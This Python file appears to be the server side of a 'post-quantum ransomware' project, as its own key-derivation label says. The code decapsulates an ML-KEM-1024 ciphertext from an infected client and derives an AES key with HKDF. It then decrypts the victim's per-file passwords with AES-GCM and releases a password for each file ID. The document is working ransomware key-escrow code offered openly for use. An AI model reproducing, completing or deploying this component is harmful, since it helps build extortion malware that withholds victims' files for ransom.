from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives import hashes
from pqcrypto.kem.ml_kem_1024 import decrypt


class Server:
    kem_secret_key: bytes
    communication_key: bytes
    client_passwords: list[str]

    def __init__(self, kem_secret_key):
        self.kem_secret_key = kem_secret_key

    def establish_shared_secret(self, ciphertext: bytes) -> bytes:
        """
        Establish a shared secret with the client using ML-KEM.

        :param self: The Server instance.
        :param ciphertext: The ciphertext received from the client.
        :return: The recovered plaintext shared secret.
        :rtype: bytes
        """

        plaintext_recovered = decrypt(self.kem_secret_key, ciphertext)
        self.shared_secret = plaintext_recovered

        return plaintext_recovered

    def derive_shared_secret(self, shared_secret: bytes):
        """
        Derive a communication key from the shared secret.

        :param self: The Server instance.
        :param shared_secret: The shared secret established with the client.
        :return: None
        """

        hkdf = HKDF(
            algorithm=hashes.SHA256(),
            length=32,
            salt=None,
            info=b"post-quantum-ransomware communication key",
        )

        self.communication_key = hkdf.derive(shared_secret)

    def get_client_passwords(
        self, passwords_iv: bytes, passwords_ciphertext: bytes, passwords_tag: bytes
    ):
        """
        Get client's files passwords.

        :param self: The Server instance.
        :param passwords_iv: The IV used for encrypting the client's passwords.
        :param passwords_ciphertext: The ciphertext of the client's passwords.
        :param passwords_tag: The authentication tag for the client's passwords.
        :return: None
        """

        cipher = Cipher(
            algorithms.AES(self.communication_key),
            modes.GCM(passwords_iv, passwords_tag),
        )
        decryptor = cipher.decryptor()
        passwords_plaintext = (
            decryptor.update(passwords_ciphertext) + decryptor.finalize()
        )

        self.client_passwords = passwords_plaintext.decode("utf-8").splitlines()

    def send_password(self, file_id) -> str:
        """
        Send the password for a specific file to the client.
        :param self: The Server instance.
        :param file_id: The ID of the file for which to send the password.
        :return: The password for the specified file.
        :rtype: str
        """

        return self.client_passwords[file_id]
